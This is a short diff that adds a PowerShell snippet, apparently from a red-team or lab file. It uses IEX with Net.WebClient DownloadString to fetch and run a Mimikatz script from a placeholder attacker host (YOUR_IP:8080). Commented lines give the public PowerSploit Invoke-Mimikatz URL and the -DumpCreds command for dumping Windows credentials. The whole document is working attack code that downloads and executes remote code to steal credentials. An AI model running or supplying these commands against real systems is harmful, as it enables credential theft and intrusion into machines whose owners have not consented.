@@ -1,0 +1,7 @@
+# Load Mimikatz from remote location
+IEX (New-Object Net.WebClient).DownloadString('http://YOUR_IP:8080/mimikatz.ps1')
+Invoke-SafeMimikatz
+
+# Real-world: Attackers use Invoke-Mimikatz from PowerSploit
+# IEX (New-Object Net.WebClient).DownloadString('https://raw.githubusercontent.com/PowerShellMafia/PowerSploit/master/Exfiltration/Invoke-Mimikatz.ps1')
+# Invoke-Mimikatz -DumpCreds
